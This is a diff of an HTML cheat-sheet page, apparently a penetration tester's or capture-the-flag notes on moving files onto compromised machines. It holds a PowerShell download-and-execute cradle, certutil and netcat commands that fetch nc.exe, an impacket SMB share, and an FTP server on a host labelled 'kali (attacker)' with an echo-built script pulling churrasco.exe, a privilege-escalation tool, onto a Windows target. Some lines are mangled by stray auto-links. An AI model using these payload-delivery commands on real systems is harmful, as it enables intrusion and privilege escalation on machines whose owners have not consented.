@@ -15,7 +15,17 @@ wget <br/>
 <br/>
 ## Windows<br/>
 IEX(New Object Net.WebClient).downloadString('http://&lt;server&gt;/&lt;file&gt;")<br/>
+<br/>
 certutil -urlcache -split -f http://&lt;ip&gt;/nc.exe<br/>
+<br/>
+<br/>
+<br/>
+<span style="font-family: lucida grande"><span style="font-size: 13pt"><div style="text-align: left">On the receiving end running,<br/>
+</div></span></span><b>nc -l -p 1234 &gt; out.file </b><br/>
+<span style="font-family: lucida grande"><span style="font-size: 13pt"><div style="text-align: left">will begin listening on port 1234.<br/>
+</div></span></span><br/>
+<span style="font-family: lucida grande"><span style="font-size: 13pt"><div style="text-align: left">On the sending end running,<br/>
+</div></span></span><b>nc -w 3 [destination] 1234 &lt; out.file </b>&nbsp;<br/>
 <br/>
 <br/>
 <b>Using SMB</b><br/>
@@ -29,5 +39,24 @@ impacket-smbserver share `pwd`<br/>
 # sender<br/>
 <br/>
 net use z: \\&lt;receiver ip&gt;\share<br/>
+<br/>
+<br/>
+<br/>
+<b>create smb with python<br/>
+<br/>
+<br/>
+<br/>
+## kali (attacker)<br/>
+python -m pyftpdlib -p 21<br/>
+<br/>
+<br/>
+C:\&gt;cd wmpub &nbsp;<br/>
+<br/>
+echo open 10.10.14.7 21&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> USER anonymous &gt;&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> anonymous&gt;&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> bin&gt;&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> GET churrasco.exe &gt;&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> bye&gt;&gt; <a href="http://ftp.txt/">ftp.txt</a>&nbsp; <br/>
+<br/>
+<br/>
+echo open 10.10.14.7 21&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> USER anonymous &gt;&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> anonymous&gt;&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> bin&gt;&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> GET nc.exe &gt;&gt; <a href="http://ftp.txt%26echo/">ftp.txt&amp;echo</a> bye&gt;&gt; <a href="http://ftp.txt/">ftp.txt</a>&nbsp; <br/>
+<br/>
+</b><b>C:\wmpub&gt;ftp -v -n -s:ftp.txt</b>&nbsp; &nbsp;<br/>
 <br/>
 </body></html>
